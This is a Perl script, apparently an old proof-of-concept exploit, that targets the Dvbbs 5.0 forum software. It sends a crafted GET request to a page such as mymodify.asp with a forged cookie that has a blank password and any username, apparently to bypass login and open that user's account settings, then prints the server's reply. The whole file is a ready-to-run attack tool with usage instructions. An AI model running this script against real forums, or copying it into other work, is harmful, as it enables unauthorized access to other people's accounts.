#!/usr/bin/perl
#Dvbbs5.0 test the script,  Bug find by analysist
#Code by wawa@21cn.com
#Welcom To Http://www.Haowawa.com/

use IO::Socket;

system('cls'); 
$ARGC = @ARGV; 
if ($ARGC != 3) { 
print "\n";
print "*****************************************************\n";
print "Dvbbs5.0 test the script  Bug find by analysist\n";
print "Code by wawa   Http://www.Haowawa.com/\n";
print "Usage: dvbbs.pl <host> <name> <way>\n"; 
print "Example: dvbbs.pl 127.0.0.1 wawa /bbs/mymodify.asp\n";
print "*****************************************************\n"; 
exit(1); 
} 

$host = @ARGV[0];
$name = @ARGV[1];
$way = @ARGV[2];

#you change ???
$port = 80;   

$req = "GET $way HTTP/1.0\n".
       "Host: $host\n".
       "Referer: $host\n".
       "Cookie: iscookies=1;aspsky=password=&username=$name\n\n";

@res = &connect;
print @res;

sub connect {
my $connection = IO::Socket::INET->new(Proto =>"tcp",
                                PeerAddr =>$host,
                                PeerPort =>$port) || die "Sorry! Could not connect to $host \n";

print $connection $req;
my @res = <$connection>; 
close $connection;
return @res;
}
 








